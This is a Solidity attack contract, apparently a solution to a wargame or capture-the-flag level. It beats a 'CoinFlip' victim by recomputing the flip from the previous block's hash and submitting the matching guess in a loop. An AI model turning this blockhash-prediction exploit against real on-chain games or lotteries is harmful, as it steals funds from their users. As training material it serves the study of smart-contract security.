// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {CoinFlip} from "../victims/CoinFlip.sol";

contract AttackCoinFlip {
    CoinFlip victim;
    address public owner;

    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _victim) {
        victim = _victim;
        owner = msg.sender;
    }

    function attack() external {
        for (uint256 i = 0; i < 10; i++) {
            callVictimWithFlip();
        }
    }

    function callVictimWithFlip() internal {
        bool guess = makeGuess();
        bool success = victim.flip(guess);
        require(success, "Attack failed");
    }

    function makeGuess() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // if (lastHash == blockValue) {
        //     revert();
        // }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
